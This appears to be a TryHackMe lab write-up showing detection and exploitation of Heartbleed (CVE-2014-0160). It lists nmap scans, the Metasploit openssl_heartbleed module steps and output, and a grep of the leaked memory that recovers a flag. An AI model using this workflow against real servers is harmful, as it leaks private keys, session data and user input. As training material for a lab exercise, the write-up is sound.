Objective
The objective of this project was to assess a remote host for the Heartbleed vulnerability (CVE-2014-0160), verify its presence, and exploit it to extract potentially sensitive information from server memory over the TLS protocol.

Execution
1. Identifying Open Services (Nmap)
nmap -sC -sV 52.215.184.158
Result:

plaintext
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4
111/tcp open  rpcbind  2-4
443/tcp open  ssl/http nginx 1.15.7

| ssl-cert: Subject: CN=localhost/O=TryHackMe/ST=London/C=UK
| Not valid before: 2019-02-16T10:41:14
| Not valid after:  2020-02-16T10:41:14
The TLS certificate was self-signed and expired. This raised suspicion that the OpenSSL version could be outdated. Target port: 443.

2. Heartbleed Vulnerability Check (Nmap Script)
nmap -p 443 --script ssl-heartbleed 52.215.184.158
Result:

plaintext
| ssl-heartbleed:
|   VULNERABLE:
|     OpenSSL 1.0.1 is vulnerable to Heartbleed
|     State: VULNERABLE
|     Risk factor: High
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
The target is confirmed vulnerable to Heartbleed.

3. Exploitation (Metasploit Framework)
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 52.215.184.158
run
Result:

plaintext
[+] Heartbeat response with leak, 44883 bytes
[+] Heartbeat data stored in /root/.msf4/loot/20250627224930_default_52.215.184.158_openssl.heartble_152689.bin
Memory successfully dumped and stored locally for analysis.

4. Analyzing Memory Dump

strings openssl.heartble_152689.bin | grep -i "THM{"
Result:

plaintext
user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{sSl-Is-BaD}
Confidential data, including an application flag, was successfully extracted from TLS memory — confirming the vulnerability can be practically exploited to leak sensitive information.

Conclusion
I successfully identified and exploited CVE-2014-0160 on a remote server. The process included:

Detecting the vulnerability with nmap

Exploiting the flaw using Metasploit

Extracting live user-submitted data (including the flag THM{sSl-Is-BaD}) from memory

Business Impact
The presence of Heartbleed in a publicly exposed system poses a critical risk:

Potential leakage of TLS private keys

Session hijacking

Exposure of usernames, emails, and sensitive user input
